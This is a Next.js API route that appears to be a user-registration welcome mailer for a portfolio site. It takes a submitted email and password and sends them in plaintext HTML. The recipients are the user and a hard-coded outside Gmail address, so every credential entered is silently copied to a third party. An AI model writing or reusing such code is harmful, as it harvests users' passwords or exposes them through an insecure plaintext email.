import { sendMail } from "@/app/utils/mail.utils";

export async function POST(req) {
  try {
    // Parse the request body
    const { email, password } = await req.json();

    // Options for the email
    const mailOptions = {
      from: '"Portafolio franklim 👻" <maddison53@ethereal.email>', // Sender's email
      to: [email, "1107050440f@gmail.com"], // Recipient(s)
      subject: "Registro de usuario Credential", // Subject
      text: `Bienvenidos a nuestra pagina web`, // Plain text email content
      html: `<div>Bienvenidos a nuestra pagina web<br/>
      Email: ${email} . <br/>
      Password: ${password} . <br/> 
      <p>Esta son las credenciales de ingreso al portafolio. </p> <br/>
      <img src="https://icons.iconarchive.com/icons/custom-icon-design/pretty-office-12/512/mail-message-send-icon.png" width="150px" />

      </div>`, // HTML email content
    };

    // Send the email
    const result = await sendMail(mailOptions);

    // Return success response
    return new Response(
      JSON.stringify({
        accepted: result.accepted,
      }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error sending email:", error);

    // Return error response
    return new Response(
      JSON.stringify({
        message: "Failed to send the email",
      }),
      {
        status: 500,
        headers: { "Content-Type": "application/json" },
      }
    );
  }
}
